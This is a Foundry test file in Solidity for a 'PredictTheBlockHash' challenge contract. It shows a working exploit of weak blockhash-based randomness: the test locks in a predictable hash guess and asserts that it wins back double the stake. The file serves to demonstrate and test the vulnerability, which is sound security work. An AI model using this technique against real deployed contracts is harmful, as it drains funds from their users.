
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public contractUnderTest;

    function setUp() public {
        contractUnderTest = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint targetBlock) public {
        // --- 1. Constraints ---
        targetBlock = uint(1000000) + targetBlock % uint(1000000);

        // --- 2. State Configuration ---
        vm.deal(address(this), 1 ether);
        vm.roll(targetBlock - 1);
        bytes32 targetHash = blockhash(targetBlock);

        // --- 3. Replication & Assertion ---
        contractUnderTest.lockInGuess{value: 1 ether}(targetHash);
        vm.roll(targetBlock + 1);

        uint balanceBefore = address(this).balance;
        contractUnderTest.settle();
        uint balanceAfter = address(this).balance;

        assertEq(balanceAfter - balanceBefore, 2 ether);
    }

    receive() external payable {}

    fallback() external payable {}
}
